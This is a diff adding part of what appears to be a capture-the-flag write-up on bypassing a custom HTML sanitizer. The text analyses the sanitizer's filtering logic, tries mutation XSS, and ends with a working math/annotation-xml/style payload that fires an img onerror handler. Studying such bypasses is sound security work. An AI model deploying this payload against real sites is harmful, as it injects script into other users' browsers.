@@ -85,3 +85,29 @@ while (nodes.length > 0) {
   }
 }
 ```
+
+
+Iterates through the fragment’s nodes recursively.
+
+Removes all attributes from each element.
+
+Then tries to remove some elements based on nodeName.length:
+```js
+if (n.nodeName !== "#document-fragment" && (n.nodeName.length === 6 || n.nodeName.length === 8))
+```
+
+As we can see that the length is not a problem because there is some payloads we can use such as svg, img, ... etc.
+
+Testing some stuff didn't worked then i tried some mutation XSS like `<table><h1>hello</h1></table>`
+
+and the result was `<h1>hello</h1><table></table>`
+
+Then i tried to construct a valid payload and got a working on :
+
+```
+<math><annotation-xml encoding="text/html"><style><img src onerror=alert(origin)>
+```
+
+
+
+
